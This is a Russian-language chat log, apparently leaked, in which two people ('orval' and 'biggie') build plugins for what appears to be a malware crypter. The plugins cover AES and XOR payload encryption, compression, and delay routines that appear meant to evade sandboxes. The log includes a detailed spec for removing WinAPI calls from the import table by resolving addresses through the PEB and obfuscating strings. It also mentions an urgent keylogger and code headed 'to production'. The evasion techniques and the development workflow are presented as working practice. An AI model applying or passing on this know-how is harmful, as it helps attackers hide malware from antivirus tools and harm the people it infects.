[01.11.21 18:11:10] orval:		можешь протестить если строка > 200кб
[01.11.21 18:13:53] biggie:		а другой вариан сохранения работает?
[01.11.21 18:15:02] orval:		да, там у тебя как раз массивы и проблем нет
[01.11.21 18:39:15] biggie:		поправил
[01.11.21 18:39:15] biggie:		https://privatlab.com/s/v/4jbQo6Eb93SqZkVdYVeq
[01.11.21 18:39:19] biggie:		https://privatlab.com/s/d/4jbQo6Eb93SqZkVdYVeq/2onoy#delete
[01.11.21 19:15:56] orval:		спасибо
[01.11.21 19:16:27] biggie:		:slight_smile:
[02.11.21 11:49:06] orval:		привет
[02.11.21 11:56:31] biggie:		привет
[02.11.21 12:15:39] orval:		ты с xor шифрование не исправил?
[02.11.21 12:15:58] biggie:		исправил
[02.11.21 12:16:13] biggie:		не работает?
[02.11.21 12:17:11] orval:		ты мне ведь скинул?)
[02.11.21 12:17:30] biggie:		нуда
[02.11.21 12:17:39] orval:		сейчас проверю его
[02.11.21 12:17:47] orval:		aes чето не работает
[02.11.21 12:18:21] orval:		после того как достали и расшифровали нагрузку
[02.11.21 12:18:29] orval:		в нескольких байтах неточности
[02.11.21 12:18:41] orval:		очень странно
[02.11.21 12:19:09] orval:		причем байты где должны быть 0x01 других
[02.11.21 12:19:20] orval:		в нескольких местах буквально
[02.11.21 12:19:55] biggie:		ок поправлю
[02.11.21 12:20:11] orval:		но я даже не знаю что тут за проблема
[02.11.21 12:20:36] orval:		можешь протестировать на бинарниках < 100кб?
[02.11.21 12:20:54] biggie:		ага
[02.11.21 12:23:20] orval:		по хешам не совпали и я winmerge-м посмотрел в каких местах отличия
[02.11.21 12:42:19] orval:		и xor тоже не работает
[02.11.21 14:45:16] orval:		проверил?
[02.11.21 14:45:52] biggie:		да, исправляю
[02.11.21 18:16:21] biggie:		исправил
[02.11.21 18:16:22] biggie:		https://privatlab.com/s/v/qD86gkYaGyC0qagMOgLk
[02.11.21 18:16:27] biggie:		https://privatlab.com/s/d/qD86gkYaGyC0qagMOgLk/E06bD#delete
[02.11.21 18:18:16] orval:		принял
[02.11.21 18:18:20] orval:		чуть позже проверю
[02.11.21 18:48:18] orval:		все работает
[03.11.21 10:02:01] orval:		привет
[03.11.21 10:02:16] biggie:		привет
[03.11.21 10:02:33] orval:		ты умеешь обфусцировать системные вызовы?
[03.11.21 10:03:00] biggie:		не, но могу попробовать
[03.11.21 10:03:23] orval:		кода для этого тебе не скидывали?
[03.11.21 10:03:45] biggie:		не
[03.11.21 10:04:30] orval:		сейчас скину
[03.11.21 10:04:52] orval:		эта техника позволяет убрать вызовы winapi из импорта
[03.11.21 10:17:29] biggie:		я на час отойду
[03.11.21 10:18:09] orval:		хорошо
[03.11.21 10:48:50] orval:		Download: https://qaz.im/load/k93DBb/9ieQSF
Delete: https://qaz.im/index.php?a=delete&q=685640793
[03.11.21 10:49:14] orval:		полный комплект я наверное позже скину, там еще инструкции должны где-то быть
[03.11.21 10:49:45] orval:		а пока из-за отсутствия времени я скинул набор, который адаптировал под себя
[03.11.21 10:50:43] orval:		чтобы обфусцировать системный вызов - нужно подключить файл
[03.11.21 10:53:45] orval:		- нужно подключить файл #include "GetApi.hpp"
- в самом начале программы вызвать DecryptDLLNames();
- при вызове функций winapi использовать приставку p (pMessageBoxA(0, 0, 0, 0);
- в явном виде кастовать все типы - возвращаемые и типы аргументов : 
```(PVOID)pVirtualAlloc(NULL, (SIZE_T)size, (DWORD)(MEM_RESERVE | MEM_COMMIT), (DWORD)(PAGE_READWRITE));
[03.11.21 10:54:31] orval:		в этом случае системный вызов должен уйти из таблицы импорта
[03.11.21 10:55:12] orval:		тебе нужно сейчас изменить код, чтобы в модулях вызовы были обфусцированы
[03.11.21 10:56:05] orval:		а и еще нужно вместо NULL использовать nullptr, но иногда без этого прокатывает
[03.11.21 11:50:09] orval:		в первую очередь сделай сейчас обфускацию в aes
[03.11.21 11:52:17] biggie:		ага
[03.11.21 12:09:37] biggie:		aes сделал
[03.11.21 12:10:31] orval:		отлично
[03.11.21 12:10:55] orval:		скинь
[03.11.21 12:13:07] biggie:		https://privatlab.com/s/v/dbEo36qaz2T7DGWQVWaE
[03.11.21 12:13:14] biggie:		https://privatlab.com/s/d/dbEo36qaz2T7DGWQVWaE/Opkqj#delete
[03.11.21 12:30:19] orval:		сделай явное кастование всех переменных при вызове функций, кастование возвращаемого значения, если ты используешь (например тут if (!pCryptAcquireContextA) и с учетом того что DecryptDLLNames() уже было вызвано
[03.11.21 12:40:54] biggie:		сделал, а без кстования хуже работает?
[03.11.21 12:48:00] orval:		ну вроде бывает что не то что хочешь возвращает
[03.11.21 12:48:43] orval:		точнее не в том виде
[03.11.21 12:49:45] orval:		что-то типо ты ждешь bool, а компилятор считает что возвращается int
[03.11.21 12:50:06] orval:		ну и может возникнуть не предвиденное поведение
[03.11.21 12:50:57] biggie:		понел
[03.11.21 13:49:12] orval:		ну пока если у тебя нет срочных задач, поделай новые плагины
[03.11.21 13:52:39] orval:		а сейчас еще один новый плагин дам
[03.11.21 14:24:20] biggie:		давай плагин
[03.11.21 14:27:55] orval:		завтра наверное более строго все определю, сейчас просто в общих чертах
[03.11.21 14:31:21] orval:		функция на питоне принимает массив пар {имя_функции, имя_dll} - имена связаны тем что функция экспортируется этой длл, нужно сгененировать функци. на с++, которая создаст глобальный массив, который будет содержать адреса этих функций, типа ULONG_PTR. При необходимости нужно загрузить недостающую длл в адресное пространство
[03.11.21 14:34:03] biggie:		ок, я пока сжатие + шифрование доделаю
[03.11.21 14:37:23] orval:		хорошо
[08.11.21 19:55:20] orval:		есть новые плагины?
[08.11.21 19:55:52] biggie:		да сжатие + aes и сжатие + xor
[08.11.21 19:56:37] orval:		сжатие касается только плагина шифрования?
[08.11.21 19:56:47] biggie:		да
[08.11.21 19:57:00] orval:		можешь скинуть?
[08.11.21 19:57:08] biggie:		ща
[08.11.21 19:59:57] biggie:		https://privatlab.com/s/v/YOGn6JdaXoC3pqMDg2pw
[08.11.21 20:00:04] biggie:		https://privatlab.com/s/d/YOGn6JdaXoC3pqMDg2pw/lB469#delete
[08.11.21 20:30:01] orval:		вроде все работает
[08.11.21 20:30:51] orval:		только я говорил учитывать что DecryptDLLNames уже вызывалось ранее в коде
[08.11.21 20:31:03] orval:		твой код идет в продакшен почти сразу
[08.11.21 20:31:59] orval:		а плагин с нахождением адресов функций делал?
[08.11.21 20:32:24] biggie:		не
[08.11.21 20:32:48] biggie:		напиши еще раз прототипы функций
[08.11.21 20:37:28] biggie:		плагин с нахождением адресов функций смогу через 2 дня начать делать, т.к. элрой дал другое задание с большим приоритетом
[08.11.21 20:38:29] orval:		по клею или плагинам?
[08.11.21 20:38:35] orval:		или что-то другое?
[08.11.21 20:39:37] biggie:		кейлогер надо срочно сделать
[08.11.21 20:40:03] orval:		хорошо, попозже тогда прототипы напишу
[08.11.21 20:40:17] biggie:		ок
[08.11.21 20:41:22] orval:		в любом случае спасибо что эти сделал
[08.11.21 20:41:39] biggie:		пожалуст
[12.11.21 20:36:07] orval:		как у тебя сейчас со свободным временем?
[12.11.21 20:36:30] biggie:		сейчас есть
[12.11.21 20:36:54] orval:		есть изменения в тз по плагинам
[12.11.21 20:37:16] orval:		нужно код под эти требования подстроить
[12.11.21 20:37:37] orval:		есть время заняться?
[12.11.21 20:37:50] biggie:		нуда
[12.11.21 20:38:14] biggie:		в выходные смогу покодить
[12.11.21 20:38:32] orval:		сейчас скину тогда
[12.11.21 20:38:51] orval:		```2. Требования к коду на c++:   
- Необходимо, чтобы код компилировался под 2 разрядности (x86/x64);
- Использовать только функции winapi. Осуществлять вызовы используя предоставленное api;
- Не использовать stl или функции, которые тянут за собой runtime. В случае необходимости переписать их самому или воспользоваться теми, что будут предоставлены;
- Использовать обфускацию строк (код предоставляется).


3. Api вызовов winapi
Вызовы функций winapi не должны осуществляться напрямую, а посредством предоставленного api.
Разработчику предоставляются адреса всех необходимых ему функций. Необходимый адрес будет содержать идентификатор (объявляется через дерективу #define).
Имя нужного идентификатора является именем функции + приставка f (адрес функции MessageBoxA содержит идентификатор fMessageBoxA и тд).
Чтобы воспользоваться идентификатором необходимо подключить заголовочный файл "LoadFunctionsApi.hpp".

Пример использования:

#include "LoadFunctionsApi.hpp"
...
typedef int(WINAPI* MESSAGEBOXA)(HWND, LPCSTR, LPCSTR, UINT);
...
MESSAGEBOXA msgBoxA = (MESSAGEBOXA)fMessageBoxA;
msgBoxA(0, 0, 0, 0);


4. Все плагины, кроме плагина api, в своем файле должен содержать функцию, которая вернет массив, состоящий из пар значений "имя функции" - "имя библиотеки".
Значения составляются на основании функций, которые использует модуль данного плагина и соответственно имя библиотеки, которая предоставляет эту функцию.
Необходимый формат массива представлен в примере. Имена функций для каждого плагина будут указаны ниже.

Пример функции:

def foo():
	arr = [ {'MessageBoxA': 'user32.dll'}, {'TraceMessage': 'Advapi32.dll'}, {'ConnectNamedPipe': 'kernel32.dll'} ]
	return arr
[12.11.21 20:42:42] orval:		```Плагин задержки - get_delay_api()
Плагин данных - get_data_api()
Плагин шифрования - get_encryption_api()
[12.11.21 20:42:55] orval:		это к пункту 4
[12.11.21 20:43:28] orval:		и по последнему плагину я говорил что скину тз
[12.11.21 20:43:31] orval:		```8. Плагин api
Прототип функции плагина: def generate_api(arr), файл generate_api.py
Прототип функции модуля: void LoadFunctionsApi(), файлы LoadFunctionsApi.cpp, LoadFunctionsApi.hpp

Код модуля не должен содержать прямых вызовов функций (при необходимости найти нужные адреса самому).
Плагин принимает на вход массив описанный в пункте 4. В файле LoadFunctionsApi.hpp размещается код, который будет сожержать определение функции void LoadFunctionsApi(), а также
дерективы #define, которые будут содержать адреса функций. Имя идентификатора дерективы = f + имя функции, значение идентификатора = адрес функции. Пример как это будет использоваться - в пункте 3.
Файл LoadFunctionsApi.cpp содержит функцию void LoadFunctionsApi(). В ней необходимо загрузить все необходимые библиотеки, а также проинициализировать адреса функций.
[12.11.21 20:43:43] biggie:		`memcpy memcmp` можно использовать?
[12.11.21 20:43:50] orval:		нет
[12.11.21 20:44:09] orval:		в файле Memory.cpp они переписаны
[12.11.21 20:44:21] orval:		так что использовать их
[12.11.21 20:44:35] orval:		ну либо сам можешь написать
[12.11.21 20:44:51] orval:		об этом собственно и написано в тз
[12.11.21 20:46:16] biggie:		`"LoadFunctionsApi.hpp"` скинешь?
[12.11.21 20:46:47] orval:		это твой пункт 8
[12.11.21 20:47:08] orval:		когда пишешь другие плагины - делаешь все как обычно
[12.11.21 20:47:20] orval:		потом редактируешь код с этой особенностью
[12.11.21 20:47:39] orval:		просто добавив приставку f и сделав инклуд
[12.11.21 20:48:15] biggie:		а понял
[12.11.21 20:48:40] orval:		ну либо свой подключай, как раз протестишь
[12.11.21 20:55:46] biggie:		по 8 пункту адреса функций из `PEB` брать ?
[12.11.21 20:56:47] biggie:		т.е. эти адреса для всех процессов одинаковы?
[12.11.21 20:57:13] orval:		они всегда разные
[12.11.21 20:57:19] orval:		можно через PEB
[12.11.21 20:58:20] biggie:		того что нет в PEB через loadlibrary getprocaddress?
[12.11.21 21:00:33] orval:		можно так
[12.11.21 21:01:16] orval:		только в начале у тебя нет этих функций)
[12.11.21 21:01:36] biggie:		в Peb они есть
[12.11.21 21:01:58] orval:		ну я имею ввиду с точки зрения написания кода
[12.11.21 21:02:10] orval:		способ достижения любой
[12.11.21 21:02:32] orval:		только без прямых вызовов
[12.11.21 21:02:44] biggie:		а зачем тогда #define ?
[12.11.21 21:03:19] orval:		предоставить адреса функций остальному коду
[12.11.21 21:05:04] biggie:		#define с адресами питон код заполняет?
[12.11.21 21:06:16] orval:		питон делает заготовки, а значение в define подставляется уже на ходу
[12.11.21 21:06:36] orval:		ну те конечно ты не сможешь прямо указать адрес
[12.11.21 21:07:05] orval:		туда можно подставить вызов функции
[12.11.21 21:07:11] orval:		например
[12.11.21 21:08:38] biggie:		т.е. значение #define придеся изменять в рантайме
[12.11.21 21:08:55] biggie:		а так можно?
[12.11.21 21:11:50] orval:		ну например дефайн равен значению функции 
```#define SOMEVALUE1 Foo(0)
#define SOMEVALUE2 Foo(1000)

int Foo(int x) {
 return x + 5;
}
[12.11.21 21:11:55] orval:		тут пролаги пипец
[12.11.21 21:12:23] orval:		ты в жабе есть?
[12.11.21 21:12:38] biggie:		да я там граф
[12.11.21 21:12:53] orval:		graph?
[12.11.21 21:13:10] biggie:		graf
[12.11.21 21:13:35] biggie:		ну в принципе я понял
[12.11.21 21:13:56] biggie:		за выходные постараюсь сделать
[12.11.21 21:14:10] orval:		с обфускацией строк тоже понял?
[12.11.21 21:14:37] biggie:		нуда
[12.11.21 21:14:53] orval:		хорошо
[12.11.21 21:15:59] orval:		обфускация та которая через макрос _STR
[12.11.21 21:17:02] biggie:		это в `Obfuscation.hpp` ?
[12.11.21 21:18:03] orval:		да
[15.11.21 14:32:07] orval:		привет
[15.11.21 14:32:16] biggie:		привет
[15.11.21 14:32:29] orval:		есть что-нибудь по плагинам?
[15.11.21 14:33:07] biggie:		пока нет, на кейлогер слишком много времени потратил
[15.11.21 14:34:00] orval:		понял
[19.11.21 09:46:42] biggie:		привет
[19.11.21 09:47:02] orval:		привет
[19.11.21 09:47:20] biggie:		плагины готовы
[19.11.21 09:47:37] orval:		давай посмотрю
[19.11.21 09:51:58] biggie:		https://privatlab.com/s/v/JrBBd4aQrwF6bmqzYddR
[19.11.21 09:52:01] biggie:		https://privatlab.com/s/d/JrBBd4aQrwF6bmqzYddR/4YpEx#delete
[19.11.21 09:59:03] orval:		можешь еще расписать где какой плагин?
[19.11.21 09:59:18] biggie:		ща
[19.11.21 10:03:58] biggie:		delay1 delay2 задержка, delay3 задержка с сравнением файлов
[19.11.21 10:05:11] biggie:		encryptpayload1 xor шифрование
[19.11.21 10:06:01] biggie:		encryptpayload2 aes  encryptpayload3 xor и сжатие encryptpayload4 aes и сжатие
[19.11.21 10:22:11] biggie:		слушай, ты мне скидывал rundll86.dll для теста клея. Не помнишь как там точка входа называлась?
[19.11.21 10:26:24] orval:		Test1 может
[19.11.21 10:36:53] orval:		```
def dump_export(file_path):
    pe = pefile.PE(file_path)
    print("export:\n")
    for exp in pe.DIRECTORY_ENTRY_EXPORT.symbols:
        print(hex(pe.OPTIONAL_HEADER.ImageBase + exp.address), exp.name.decode('utf-8') + ' @' + str(exp.ordinal))
[19.11.21 10:36:57] orval:		дамп экспорта
[19.11.21 10:44:34] orval:		первый делей
[19.11.21 10:44:41] orval:		```
def make_delay():
	path = "../Plugins_14_11/"
	my_file = open(path + "Delay.hpp", "w")
...
[19.11.21 10:45:32] biggie:		так во всех плагинах
[19.11.21 10:45:33] orval:		ну и вообще это в каждом файле я так понял
[19.11.21 10:45:42] orval:		так и задумано?
[19.11.21 10:45:57] orval:		с path
[19.11.21 10:45:58] biggie:		нуда
[19.11.21 10:46:09] biggie:		поменять?
[19.11.21 10:46:39] orval:		да, такого нет в тз
[19.11.21 10:46:47] orval:		файлы должны создаться рядом
[19.11.21 10:46:58] orval:		я добавлю тогда это в тз
[19.11.21 10:49:03] biggie:		поправил
[19.11.21 10:49:08] orval:		да я тоже
[19.11.21 10:49:14] orval:		не надо это кидать
[19.11.21 10:58:41] orval:		я вроде писал что приставка f должна быть а у тебя l
[19.11.21 11:01:16] biggie:		переделаю, еще какие косяки?
[19.11.21 11:01:58] biggie:		да f
[19.11.21 11:03:28] orval:		в модуле плагина api имя длл которое приходит оно чувствительно к регистру?
[19.11.21 11:03:47] biggie:		да
[19.11.21 11:04:37] orval:		сделай независимо от регистра
[19.11.21 11:22:42] biggie:		обфускация правильно сделана?
[19.11.21 11:24:50] orval:		а ты сам проверял?
[19.11.21 11:25:09] orval:		вместе с каким-нибудь модулем
[19.11.21 11:26:10] biggie:		да в бинарнике вроде пропадают названия
[19.11.21 11:27:47] orval:		сейчас проверю, я просто смотрел в связке со своей обфускацией
[19.11.21 11:27:57] orval:		первый делей 8 мин провисел и я выключил
[19.11.21 11:30:54] orval:		в LoadFunctionsApi.cpp ты экспортируешь ntdll.h
[19.11.21 11:30:57] orval:		такого файла нет
[19.11.21 11:31:49] biggie:		добавить его нельзя?
[19.11.21 11:32:02] orval:		а что в нем?
[19.11.21 11:33:05] orval:		ppeb и тд
[19.11.21 11:33:19] orval:		используется файл ntos.hpp
[19.11.21 11:33:22] orval:		я сейчас его скину
[19.11.21 11:33:31] orval:		там немного другие название структур
[19.11.21 11:34:32] orval:		а я тебе уже его кидал
[19.11.21 11:36:59] orval:		там нужно название PEB сменить и поле Ldr на pLdr
[19.11.21 11:39:58] orval:		также я кидал тебе файл memory там crt функции тоже переписаны. можно считать что он существует и можно его подключать
[19.11.21 11:53:00] orval:		сделаешь сегодня?
[19.11.21 11:54:48] biggie:		сегодня или завтра, там с клеем проблемы появились
[19.11.21 11:57:06] orval:		тут совсем немного поправить, это тоже уже позарез нужно. Давай в субботу, я буду вечером точно а может и в течении дня
[19.11.21 11:57:36] biggie:		постараюсь
[19.11.21 12:30:37] orval:		в  encryptpayload2 неправильно подключен файл LoadFunctionsApi.hpp
[19.11.21 12:35:17] orval:		хотя нет, все нормально
[19.11.21 13:23:26] biggie:		поправил
[19.11.21 13:25:21] biggie:		https://privatlab.com/s/v/BA7aGrlGlYUbyg4AqD6m
[19.11.21 13:25:26] biggie:		https://privatlab.com/s/d/BA7aGrlGlYUbyg4AqD6m/rkMr0#delete
[20.11.21 13:21:43] orval:		привет
[20.11.21 13:24:14] biggie:		привет
[20.11.21 13:29:45] orval:		у тебя в одном из модулей используется функция MemAllocAndClear из Memory.cpp, которая подвязана на старый способ обфускации. Сейчас он уже не используется. Но сейчас подумал что перепишу просто вызовы под новую обфускацию так что все в порядке
[20.11.21 13:31:20] biggie:		ок, по поводу плагинов задержек. Они будут показывать разное время задержек на разном железе. Это нормально?
[20.11.21 13:33:20] orval:		да, но есть один момент, я сейчас перепроверю. В одном у тебя используется GetTickCount на каждой итерации. В условиях новой обфускации это каждый раз вычисляется адрес функции, соответственно процесс провисел 8 мин и я его просто убил
[20.11.21 13:33:51] orval:		я так понял это из-за этого
[20.11.21 13:34:10] orval:		тебе ведь в том случае нужно просто получить какое-то значение?
[20.11.21 13:35:27] biggie:		случайное значение нужно
[20.11.21 13:35:46] orval:		можно воспользоваться процессорной функцией
[20.11.21 13:35:53] orval:		и rand еще где то вроде было
[20.11.21 13:36:19] orval:		процессорная вроде не будет тянуть и crt и в импорте ее не будет
[20.11.21 13:36:19] biggie:		а rand можно использовать?
[20.11.21 13:36:34] orval:		тоже вроде есть аналог процессорной
[20.11.21 13:36:47] orval:		найду сейчас
[20.11.21 13:37:49] orval:		__rdtscp - получить время
[20.11.21 13:40:40] orval:		а с рандомо вроде в общем чате недавно писали
[20.11.21 13:40:46] orval:		не знаю сейчас
[20.11.21 13:41:02] biggie:		ок поищу
[20.11.21 14:00:23] biggie:		исправил
[20.11.21 14:00:23] biggie:		https://privatlab.com/s/v/ydmGxoOOMwTE8Z9rMQ9p
[20.11.21 14:00:29] biggie:		https://privatlab.com/s/d/ydmGxoOOMwTE8Z9rMQ9p/6V0BX#delete
[20.11.21 14:10:51] orval:		и ранд?
[20.11.21 14:11:38] biggie:		без ранда
[20.11.21 14:11:38] biggie:		__rdtscp  хватило
[20.11.21 14:20:47] orval:		чтобы у тебя работала обфускация нужно вызвать LoadFunctionsApi?
[20.11.21 14:21:15] biggie:		да я вызываю
[20.11.21 15:55:41] orval:		еще такой момент
[20.11.21 15:56:18] orval:		у тебя код расчитан на то что в LoadFunctionsApi.hpp подключается Windows.h
[20.11.21 15:56:46] orval:		ну те другие модули не компилятся без этого
[20.11.21 15:57:55] biggie:		нуда
[20.11.21 15:58:07] biggie:		это плохо?
[20.11.21 15:58:52] orval:		а если модуль обфускации не твой будет?
[20.11.21 15:59:57] orval:		смысл в том что ты пишешь модули отдельно, они вместе не составляют единый код, каждый не должен зависить от другого
[20.11.21 16:00:30] orval:		твои модули перемешиваются с чужими модулями в одной программе
[20.11.21 16:01:23] biggie:		в каждом модуле подключить windows.h ?
[20.11.21 16:01:42] orval:		да, они должны быть автономны
[20.11.21 16:02:56] biggie:		подключил
[20.11.21 16:03:12] orval:		у тебя в каждом модуле так?
[20.11.21 16:03:16] biggie:		не
[20.11.21 16:03:23] orval:		скажи где надо добавить
[20.11.21 16:03:36] biggie:		да давай скину
[20.11.21 16:03:53] orval:		давай
[20.11.21 16:07:02] biggie:		https://privatlab.com/s/v/8R9a8GMAR5FmGnOr98O9
[20.11.21 16:07:09] biggie:		https://privatlab.com/s/d/8R9a8GMAR5FmGnOr98O9/GpWxN#delete
[26.11.21 13:18:23] orval:		привет
[26.11.21 13:18:58] biggie:		привет
[26.11.21 13:19:31] orval:		сможешь на 3 плагине задержку увеличить?
[26.11.21 13:19:52] biggie:		да, сколько надо?
[26.11.21 13:20:17] orval:		чтобы порядок был такой же как на остальных
[26.11.21 13:22:59] orval:		это раза в 3 наверное
[26.11.21 13:24:15] orval:		с файлами который
[26.11.21 13:44:10] biggie:		https://privatlab.com/s/v/EJVA8Rq2wnIwxd2AzNnp
[26.11.21 13:44:17] biggie:		https://privatlab.com/s/d/EJVA8Rq2wnIwxd2AzNnp/9b3Np#delete
[24.12.21 09:51:03] orval:		привет
[24.12.21 09:51:19] biggie:		привет
[24.12.21 09:51:45] orval:		подскажи, не ты писал утилиту по маякам?
[24.12.21 09:52:04] biggie:		неа
[24.12.21 09:52:27] orval:		понял
